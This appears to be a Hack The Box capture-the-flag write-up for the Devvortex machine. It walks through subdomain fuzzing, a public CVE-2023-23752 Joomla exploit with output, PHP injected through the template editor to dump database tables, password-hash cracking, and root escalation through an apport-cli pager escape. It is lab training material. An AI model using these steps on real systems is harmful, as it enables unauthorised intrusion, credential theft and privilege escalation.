# Initial Enumeration
## General Info
I started off with a full Nmap scan using NmapAutomator. This is a summary of the findings:
- **OS:** Linux
- **Ports and Services:**
  - **SSH:** 22 --> Version: OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
  - **HTTP:** 80 --> Webserver Version: nginx/1.18.0 (Ubuntu)
The main thing running on the machine is the web app on port 80, which is hosting `devvortex.htb`.

# Enumerating the Web App
On `http://devvortex.htb`, is a website of a web development agency called DevVortex. Exploring all the pages, forms, and parameters on the website didn't yeald any interesting findings. 

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/c6ee3611-c3fc-40ce-9a7c-1e544de3db28)

Exploring all the pages, forms, and parameters on the website didn't yeald any interesting findings, so lets dig deeper info subdomains and directories.

## Subomains and Directories
Lets map all the subdomains and directories on the app. To do this we will be using variations of the following **Ffuf** queries (start with the basic and develop them as we find more directories):
```bash
# Enumerate directories
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://devvortex.htb/FUZZ -ic

# Enumerate virtual hosts (== subdomains)
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://devvortex.htb/ -H 'Host: FUZZ.devvortex.htb'
```

Here are the results:

```
devvortex.htb/
    /index.html
    /about.html
    /do.html
    /portfolio.htmk
    /contact.html
    /tracking/
        /tracking.js
-------------------------------------------------------------------------------------
dev.devvortex.htb/
    /home/
    /images/
    /media/
    /modules/
    /plugins/
        /system/cache/cache.xml
    /includes/
    /language/
    /components/
    /api/
    /cache/
    /libraries/
    /tmp/
    /layouts/
    /administrator/
        /help/
        /templeates/
        /modules/
        /includes/
        /cache/
        /components/
        /language/
        /logs/
        /manifests/files/joomla.xml
        /index.php
    /cli
    /templates/
    /portfolio-details.html [404]
    /index.html [404]
    /index.php
    /configuration.php
    /htaccess.txt 
    /web.config.txt 
    /LICENSE.txt 
    /README.txt
```

We didn't find anything interesting directories on the main domain, but we did find the subdomain `dev.devvortex.htb`, that seems to contain some very interesting directories - especially `dev.devvortex.htb/administrator/`! Browsing to this page, we found a **Joomla Administrator Login** page:

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/fd880531-e87b-42a2-a9d9-9bb83cd2be83)

We didn't have prior experience with Joomla, so lets see if there are any known tricks online we can use to enumerate it. Luckily, we found a section on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version) dedicated to Joomla! We managed to find the target's Joomla version by reading `/administrator/manifests/files/joomla.xml`:  

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/3b83ebe4-3a9a-412c-9cdd-d76a43f7d652)

After some short googling we found that this version of Joomla (4.2.6) is vulnerable to CVE-2023-23752, and we found this [PoC](https://github.com/Acceis/exploit-CVE-2023-23752/blob/master/exploit.rb) on GitHub! We downloaded the ruby script to our machine and executed it:

```bash
─[user@parrot]─[~/Documents/tmp/devvortex/exploit-CVE-2023-23752]
└──╼ $ruby exploit.rb http://dev.devvortex.htb
Users
[649] lewis (lewis) - lewis@devvortex.htb - Super Users
[650] logan paul (logan) - logan@devvortex.htb - Registered

Site info
Site name: Development
Editor: tinymce
Captcha: 0
Access: 1
Debug status: true

Database info
DB type: mysqli
DB host: localhost
DB user: lewis
DB password: <PASSWORD>
DB name: joomla
DB prefix: sd4fg_
DB encryption 0
```

We found credentials for a user named `lewis`, and some details on the MySQL DB used! Lets try to login to Admin Dashboard we found:

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/2b34efb9-a1ec-426b-8813-83a60e47a170)

# Get Foothold
We explored all the pages and functunalities on the website, but couldn't find anything that seemed relevant, so we tried our luck again on Google. We found a blog post on [Joomla Security](https://medium.com/@aswinchandran274/joomla-security-insights-rce-f521b762acba) that details some usefull tricks we can use. In step 11, it showed how an attacker can use a page editing function that this web app has inorder to inject a payload! We found the page editing function by: `System --> Administrator Templates --> Atum Details and Files`. We have a few pages we can edit the contents of, but only one of them actually exists on this app - `index.php`:

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/97246d81-c601-4dee-b245-d62a8ce8a290)

Here is where we wasted a LOT of time - we injected a payload that gets us a reverse shell as `www-data`, and tried to get to the user from there, but couldn't find anything that worked. It's important to remember that we can use this injection point to just to get a reverse shell, but also to get more information. Maybe we can use the MySQL credentials we found to read the contents of some interesting tables, and reflect their contents onto the page?

We asked ChatGPT to write us a PHP script that would do exactly that:
```php
<?php

$host = '127.0.0.1';
$port = '3306';
$username = 'lewis';
$password = '<PASSWORD>';
$database = 'joomla';

// Create a MySQL connection
$mysqli = new mysqli($host, $username, $password, $database, $port);

// Check connection
if ($mysqli->connect_error) {
    die("Connection failed: " . $mysqli->connect_error);
}

// Execute a query
$query = '<SQL QUERY>';
$result = $mysqli->query($query);

// Check for errors
if (!$result) {
    die("Query failed: " . $mysqli->error);
}

// Print the results
while ($row = $result->fetch_assoc()) {
    print_r($row);
    echo PHP_EOL;
}

// Close the MySQL connection
$mysqli->close();

?>
```

First, we want to check which tables are present in the DB. To do that we will inject the above script with this SQL query: `SHOW TABLES;`.

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/047cf695-0b80-4c6f-89f9-e5c9ca888e8b)


Now, we will read the contents of tables we think are relevent, using `SELECT * FROM <TABLE NAME>;` until we found a relevant one - `sd4fg_users`!

![image](https://github.com/danagold404/Hack-The-Box-Writeups/assets/81072283/b72f4488-6d18-4184-8151-e557e015c5be)

# Get User Flag
We found a password hash for the user `logan`! Lets use **John The Ripper** to get the password. But first, we remeber something we saw on the website - there is a **minimum requirement for a valid password** to contain at least 12 characters. We can use this to filter `rockyou.txt` and make the hash cracking process quicker! We can filter `rockyou.txt` using this command:

```bash
cat /usr/share/wordlists/rockyou.txt | grep -E '^.{12,}$' > filtered-rockyou.txt
```

Lets crack the hashes using **John**:

```bash
┌─[user@parrot]─[~/Documents/tmp/devvortex]
└──╼ $john --wordlist=filtered-rockyou.txt crack.txt
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<PASSWORD>    (?)
1g 0:00:00:00 DONE (2023-11-28 17:03) 4.000g/s 144.0p/s 144.0c/s 144.0C/s tequieromucho..highschoolmusical
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

We can now SSH to tharget and connect as user `logan`, that has the user flag in his home folder!

```bash
logan@devvortex:~$ ls -la
total 28
drwxr-xr-x 3 logan logan 4096 Nov 21 11:04 .
drwxr-xr-x 3 root  root  4096 Sep 26 19:16 ..
lrwxrwxrwx 1 root  root     9 Oct 26 14:58 .bash_history -> /dev/null
-rw-r--r-- 1 logan logan  220 Sep 26 19:16 .bash_logout
-rw-r--r-- 1 logan logan 3771 Sep 26 19:16 .bashrc
drwx------ 2 logan logan 4096 Oct 26 15:12 .cache
-rw-r--r-- 1 logan logan  807 Sep 26 19:16 .profile
-rw-r----- 1 root  logan   33 Nov 28 15:00 user.txt
```

# Privesc to Root
The first thing we will be checking is `sudo -l`:
```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

This user can execute apport-cli with sudo! Lets do a quick check on Google for any vulnerabilities. We found a [PoC](https://github.com/canonical/apport/commit/e5f78cc89f1f5888b6a56b785dddcb0364c48ecb) for CVE-2023-1326, according to which:
> The apport-cli supports view a crash. These features invoke the default pager, which is likely to be less, other functions may apply. It can be used to break out from restricted environments by spawning an
interactive system shell. If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.

We will follow the PoC and manage to get command execution as root!

```bash
logan@devvortex:/var/tmp$ cd /var/crash
logan@devvortex:/var/crash$ touch exploit.crash
logan@devvortex:/var/crash$ sudo apport-cli -c exploit.crash less

*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.
.................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V

What would you like to do? Your options are:
  S: Send report (1.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V

What would you like to do? Your options are:
  S: Send report (1.7 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): v
uid=0(root) gid=0(root) groups=0(root)
!done  (press RETURN)
total 28
drwx------  4 root root 4096 Nov 21 11:04 .
drwxr-xr-x 19 root root 4096 Oct 26 15:12 ..
lrwxrwxrwx  1 root root    9 Jan 20  2021 .bash_history -> /dev/null
-rw-r--r--  1 root root 3106 Dec  5  2019 .bashrc
drwxr-xr-x  3 root root 4096 Oct 29 16:21 .cleanup
-rw-r--r--  1 root root  161 Dec  5  2019 .profile
drwx------  2 root root 4096 Oct 26 15:12 .ssh
-rw-r-----  1 root root   33 Nov 28 15:00 root.txt
!done  (press RETURN)
```
